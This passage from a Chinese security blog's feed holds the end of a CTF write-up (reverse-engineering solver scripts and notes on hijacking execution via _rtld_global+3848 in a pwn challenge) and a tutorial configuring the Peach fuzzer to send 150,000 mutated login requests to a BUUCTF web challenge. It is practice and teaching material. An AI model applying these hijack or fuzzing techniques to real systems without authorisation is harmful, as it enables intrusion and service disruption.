class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="keyword">and</span> c1&lt;=<span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(c1),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> (c2&gt;=<span class="built_in">ord</span>(<span class="string">&#x27;n&#x27;</span>) <span class="keyword">and</span> c1&lt;=<span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>)) <span class="keyword">or</span> (c2&gt;=<span class="built_in">ord</span>(<span class="string">&#x27;N&#x27;</span>) <span class="keyword">and</span> c2&lt;=<span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(c2),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">f=<span class="string">&quot;87,101,95,119,49,49,108,95,102,49,103,104,116,95,116,48,95,101,110,100,95,116,48,95,101,110,100,95,99,97,122,121&quot;</span></span><br><span class="line">k=f.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> k:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果</p><img src="https://c2.im5i.com/2022/01/08/UdKjO.png" style="zoom:67%;" /><h3 id="RE2"><a href="#RE2" class="headerlink" title="RE2"></a>RE2</h3><p>字符串中发现这一串比较特殊，直接base64解码，拿到flag。</p><img src="https://c2.im5i.com/2022/01/08/UdfU4.png" style="zoom: 67%;" /><p>结果</p><img src="https://c2.im5i.com/2022/01/08/Udd6d.png" style="zoom:67%;" /><h3 id="RE3"><a href="#RE3" class="headerlink" title="RE3"></a>RE3</h3><p>直接在线网站进行一波反编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_1</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">        flag[num] = flag[num] ^ num</span><br><span class="line">        num -= <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> num &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_2</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">        flag[num] = flag[num] ^ flag[num + <span class="number">1</span>]</span><br><span class="line">        num -= <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> num &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">Happy = [</span><br><span class="line">    <span class="number">44</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    <span class="number">50</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">90</span>,</span><br><span class="line">    <span class="number">5</span>,</span><br><span class="line">    <span class="number">102</span>,</span><br><span class="line">    <span class="number">10</span>,</span><br><span class="line">    <span class="number">112</span>]</span><br><span class="line">num = <span class="number">9</span></span><br><span class="line">f = <span class="built_in">input</span>(<span class="string">&#x27;Please input your flag:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(f) != <span class="number">10</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Your input is illegal&#x27;</span>)</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">flag = <span class="built_in">list</span>(f)</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag to &#x27;ord&#x27;:&quot;</span>, flag)</span><br><span class="line">t1 = threading.Thread(encode_1, (<span class="number">1</span>,), **(<span class="string">&#x27;target&#x27;</span>, <span class="string">&#x27;args&#x27;</span>))</span><br><span class="line">t2 = threading.Thread(encode_2, (<span class="number">2</span>,), **(<span class="string">&#x27;target&#x27;</span>, <span class="string">&#x27;args&#x27;</span>))</span><br><span class="line">t1.start()</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">t2.start()</span><br><span class="line">t1.join()</span><br><span class="line">t2.join()</span><br><span class="line"><span class="keyword">if</span> flag == Happy:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Good job!&#x27;</span>)</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;No no no!&#x27;</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>大致意思就是开了两个线程，对输入每隔1s进行不同的操作，然后最后结果是Happy数组。逆回去也很简单，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">flag = [</span><br><span class="line">    <span class="number">44</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    <span class="number">50</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">90</span>,</span><br><span class="line">    <span class="number">5</span>,</span><br><span class="line">    <span class="number">102</span>,</span><br><span class="line">    <span class="number">10</span>,</span><br><span class="line">    <span class="number">112</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]^i),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]^flag[i+<span class="number">1</span>]),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>结果如图</p><img src="https://c2.im5i.com/2022/01/08/UdliW.png" style="zoom:80%;" /><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>今天收获还蛮多的，虽然不怎么会 <code>off-by-null</code>，但网上找了个模板就直接出了，具体细节还得动调复盘下，pwn3对&lt;_rtld_global+3848&gt; 的利用也是经师傅指点才知道，也需复盘。不过今天打得有些累了，明天再整理一下题目的细节好了。</p><hr><h2 id="复盘更新"><a href="#复盘更新" class="headerlink" title="复盘更新"></a>复盘更新</h2><p>关于 <code>exit</code> 对 &lt;_rtld_global+3848&gt; 的调用，直接动调步进 <code>exit</code> 函数，关键代码段如下。</p><img src="https://c2.im5i.com/2022/01/09/Uf4aP.png" style="zoom:80%;" /><p>看一下 rdx&lt;0x7f0c647c9af0&gt; 里面的主要代码，发现确实调用了 &lt;_rtld_global+3848&gt; 处，因此只要修改该处，便能劫持程序的执行流。</p><p>其实这道题，一开始我的思路是将 exit 函数处的第一句代码汇编改为 <code>call one_gadget</code> 的形式，但后来意识到 libc 上没有写的权限。这道题便很好的打开了思路——<strong>就是步进，去底层找该函数对某个特定地址的调用，修改该处的地址同样也可以劫持程序执行流</strong>。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;中午前就做完了前两题，pwn1还拿了个三血，8错8错。下午又搞出一道蛮有意思的pwn。逆向就做了几道简单题。&lt;/p&gt;
&lt;h2 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h2&gt;&lt;h3 id=&quot;PWN1&quot;&gt;&lt;a href=&quot;#PWN1&quot; class=&quot;headerlink&quot; title=&quot;PWN1&quot;&gt;&lt;/a&gt;PWN1&lt;/h3&gt;&lt;p&gt;栈溢出。给了后门和 buf 的地址。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="wp" scheme="http://example.com/categories/ctf/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>peach学习及在web领域的应用</title>
    <link href="http://example.com/2022/01/04/peach/"/>
    <id>http://example.com/2022/01/04/peach/</id>
    <published>2022-01-04T10:02:26.000Z</published>
    <updated>2023-02-20T06:22:46.433Z</updated>
    
    <content type="html"><![CDATA[<p>网上关于peach框架的资料少的可怜。最后跟着一位博主的博客学了下来，不过学的是Fuzz Web Api。就是下面的博客。感谢大佬。</p><blockquote><p><a href="https://blog.csdn.net/qq_27446553/article/details/103278465?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-4.no_search_link&spm=1001.2101.3001.4242.3&utm_relevant_index=7">Peach原理简介与实战：以Fuzz Web API为例</a></p></blockquote><p>接下来就简单记录一下今天下午对peach框架的粗浅尝试。</p><h3 id="以下是工作文件夹和成果展示"><a href="#以下是工作文件夹和成果展示" class="headerlink" title="以下是工作文件夹和成果展示"></a>以下是工作文件夹和成果展示</h3><span id="more"></span><p>用于构建peach数据、状态、配置模型的工作文件夹</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/36888/13/19529/96612/63f30d08Feb24adf9/a6aea8c9943dd22f.png" style="zoom:80%;" /><p>终端上跑起来的效果</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/147533/9/35684/456840/63f30d2dF161352fc/a08d0db0bc4af605.png" style="zoom:80%;" /><p>BurpSuite上收到的相应报文</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/98767/29/33250/297091/63f30d0bFb8fb82ca/6bd323358754cd20.png" style="zoom: 80%;" /><h2 id="以BUUCTF上的-HFCTF2020-EasyLogin作测试目标平台"><a href="#以BUUCTF上的-HFCTF2020-EasyLogin作测试目标平台" class="headerlink" title="以BUUCTF上的[HFCTF2020]EasyLogin作测试目标平台"></a>以BUUCTF上的[HFCTF2020]EasyLogin作测试目标平台</h2><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/139096/24/33662/90948/63f30d09Fb4c62a89/64c19668c4ee0bbd.png"  /><h3 id="1-获取请求报文的模板作为login-bin"><a href="#1-获取请求报文的模板作为login-bin" class="headerlink" title="1. 获取请求报文的模板作为login.bin"></a>1. 获取请求报文的模板作为login.bin</h3><p>我们输入用户名和密码后，点击LOGIN按钮，此时客户端就会发送一个请求，在BurpSuite上我们便能拿到该请求模板，如下图。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/146986/39/33790/197181/63f30d09F92d9b534/300bedb499608595.png"  /><p>我们新建一个文件夹，将该模板复制到 login.bin 里，如下图。（可以随意命名，保存为.bin文件即可</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/135662/23/29143/105109/63f30e75F10af121f/30fb22f355f79ada.png" style="zoom: 80%;" /><h3 id="2-根据-bin模板构造数据模型1-my-data-xml"><a href="#2-根据-bin模板构造数据模型1-my-data-xml" class="headerlink" title="2. 根据.bin模板构造数据模型1-my_data.xml"></a>2. 根据.bin模板构造数据模型1-my_data.xml</h3><p>创建一个1-my_data.xml，存放如下代码。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Peach</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach ../peach.xsd&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">DataModel</span> <span class="attr">name</span>=<span class="string">&quot;my_data_model&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">DataModel</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">Peach</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中DataModel元素下放的便是各行的<strong>字符串或符号</strong>，需要区分开来。以前几行为例。token代表是否为特殊符号，像 <strong>‘:’ ‘&amp;’<strong>之类的都要进行区分。mutable意为可变的，也就是该数据模块需要<span style="color:red;font-weight:600">变异</span>的地方。笔者是对</strong>admin</strong>和<strong>password</strong>的值设置可变异。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/143628/18/31276/331864/63f30ed8Fa32d3a88/5a67d3a1bd2bb451.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/49739/34/18962/171555/63f30e66F3b53cfe1/0ae126b36d5a29fe.png" style="zoom:80%;" /><p>构造DataModel是一个比较费力的过程，还好Peach安装包里提供了校验DataModel是否与我们的.bin对应的工具Peach Validator，才让长时间的努力有了效率。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/194622/32/32714/457318/63f30ed7Ff9c6f305/7222cd64af03823e.png" style="zoom: 67%;" /><h3 id="3-构造配置模型2-my-xml-config"><a href="#3-构造配置模型2-my-xml-config" class="headerlink" title="3. 构造配置模型2-my_xml.config"></a>3. 构造配置模型2-my_xml.config</h3><p>需根据目标端口进行配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PitDefines</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">All</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IPv4</span> <span class="attr">key</span>=<span class="string">&quot;TargetAddress&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">value</span>=<span class="string">&quot;848e59df-143b-4177-bf5b-c6b70a18e040.node4.buuoj.cn&quot;</span> /&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;<span class="name">Range</span> <span class="attr">key</span>=<span class="string">&quot;TargetPort&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">value</span>=<span class="string">&quot;81&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">min</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">max</span>=<span class="string">&quot;65535&quot;</span> /&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="tag">&lt;<span class="name">Range</span> <span class="attr">key</span>=<span class="string">&quot;Timeout&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">value</span>=<span class="string">&quot;5000&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">min</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">max</span>=<span class="string">&quot;999999&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">All</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">PitDefines</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Peach</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-构建状态模型3-my-state-xml"><a href="#4-构建状态模型3-my-state-xml" class="headerlink" title="4. 构建状态模型3-my_state.xml"></a>4. 构建状态模型3-my_state.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Peach</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach ../peach.xsd&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 导入数据模型 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Include</span> <span class="attr">ns</span>=<span class="string">&quot;MyData&quot;</span> <span class="attr">src</span>=<span class="string">&quot;D:\\Fuzz——peach\\MyPeachPit\\1-my_data.xml&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">StateModel</span> <span class="attr">name</span>=<span class="string">&quot;My_State&quot;</span> <span class="attr">initialState</span>=<span class="string">&quot;state_one&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">State</span> <span class="attr">name</span>=<span class="string">&quot;state_one&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Action</span> <span class="attr">type</span>=<span class="string">&quot;output&quot;</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 引用名为my_data_model的ModelData --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">DataModel</span> <span class="attr">ref</span>=<span class="string">&quot;MyData:my_data_model&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Data</span> <span class="attr">fileName</span>=<span class="string">&quot;D:\\Fuzz——peach\\MyPeachPit\\login.bin&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Action</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">Action</span> <span class="attr">type</span>=<span class="string">&quot;input&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">DataModel</span> <span class="attr">name</span>=<span class="string">&quot;NULL&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Blob</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">DataModel</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">State</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">StateModel</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">Peach</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-构建综合模型4-my-integrate-xml"><a href="#5-构建综合模型4-my-integrate-xml" class="headerlink" title="5. 构建综合模型4-my_integrate.xml"></a>5. 构建综合模型4-my_integrate.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Peach</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach ../peach.xsd&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 引入状态模型 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Include</span> <span class="attr">ns</span>=<span class="string">&quot;MyState&quot;</span> <span class="attr">src</span>=<span class="string">&quot;D:\\Fuzz——peach\\MyPeachPit\\3-my_state.xml&quot;</span> /&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">Agent</span> <span class="attr">name</span>=<span class="string">&quot;LocalAgent&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Agent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Test</span> <span class="attr">name</span>=<span class="string">&quot;Default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Agent</span> <span class="attr">ref</span>=<span class="string">&quot;LocalAgent&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">StateModel</span> <span class="attr">ref</span>=<span class="string">&quot;MyState:My_State&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">Publisher</span> <span class="attr">class</span>=<span class="string">&quot;Tcp&quot;</span> <span class="attr">name</span>=<span class="string">&quot;tcp&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 为BurpSuite代理ip --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">&quot;Host&quot;</span> <span class="attr">value</span>=<span class="string">&quot;127.0.0.1&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">&quot;Port&quot;</span> <span class="attr">value</span>=<span class="string">&quot;8080&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">&quot;Timeout&quot;</span> <span class="attr">value</span>=<span class="string">&quot;5000&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Publisher</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">Logger</span> <span class="attr">class</span>=<span class="string">&quot;File&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">&quot;Path&quot;</span> <span class="attr">value</span>=<span class="string">&quot;##LogPath##&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Logger</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Peach</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同时修改BurpSuite上的代理信息，ip和端口不用改，只需将其重定位至目标靶机，如下图。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/191931/20/33255/92329/63f30e6fF8ef6d164/475421ea9573964f.png" style="zoom: 67%;" /><h3 id="6-最后检验测试套是否正确"><a href="#6-最后检验测试套是否正确" class="headerlink" title="6. 最后检验测试套是否正确"></a>6. 最后检验测试套是否正确</h3><p>在其目录下输入以下命令<code>peach 4-my_integrate.xml -1</code>，出现下图就说明配置成功了。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/123158/8/35793/67146/63f3107cF0548a812/8c4610fcb5dc6a2d.png" style="zoom:80%;" /><h3 id="7-开始fuzz"><a href="#7-开始fuzz" class="headerlink" title="7. 开始fuzz"></a>7. 开始fuzz</h3><p>输入命令<code>peach 4-my_integrate.xml -range 1,150000</code></p><p>意为发送15w个变异报文，15w为官方推荐数量。</p><p>注：记得关掉 intercept 截听器，否则得一个个按forward发送请求报文，最后在Http History界面筛选异常报文即可。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>作为一名菜鸡二进制手，学到了挺多的web知识，也挺好。在实践中稍微熟悉了peach框架的构建流程。</p><p>不过也遇到了很多问题，就是”Content-Length”的值的问题，因为长度如果一直是固定的话发送的请求头该怎么进行长度变异？不过在检测报文时还是观察到某些请求报文的”Content-Length”是会改变的，不过是极少数，如下。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/138332/21/29339/258119/63f31074Fab9ff6f9/8a782e9e75153d37.png" style="zoom:80%;" /><p>大部分是缺参数的，如下。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/111442/11/31651/192774/63f31074F6b9a25a5/0c9623296ed13b49.png" style="zoom: 67%;" /><p>打算明天改进一下DataModel这样子。</p><hr><p>隔天实践了一下，发现将bin中和datamodel中的”Content-Length”改大后，就例如我设置了1000，那么我的请求体的长度范围便是[0,1000]，范围设置越大越好。如我所料，变异请求体的长度变化了很多，也印证了我前几天的思考。同时我还修改了参数authorization的值为可变。虽然仍然跑不出异常结果就对了。（当然很有可能是这道题的考点就不在这里）。以下是今天跑出的各类变异请求体。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/32032/12/21330/196376/63f3108fFd6f8f835/a1fa56905ef5b86b.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/106804/13/25217/180378/63f31074F30ae7716/f2c31195589d6f73.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/138287/24/33317/131526/63f3116bF492f304c/deda6ef59252705d.png"  /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/198394/7/30757/129740/63f31146F6a2daa04/160c56927739fa38.png"  /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/110505/27/35272/79810/63f31147F55d19a83/91cc7631539cb7fa.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/185169/19/29635/140331/63f31159Ff819f253/47d04247431b6e8f.png"  />]]></content>
    
    
    <summary type="html">&lt;p&gt;网上关于peach框架的资料少的可怜。最后跟着一位博主的博客学了下来，不过学的是Fuzz Web Api。就是下面的博客。感谢大佬。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_27446553/article/details/103278465?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-4.no_search_link&amp;spm=1001.2101.3001.4242.3&amp;utm_relevant_index=7&quot;&gt;Peach原理简介与实战：以Fuzz Web API为例&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
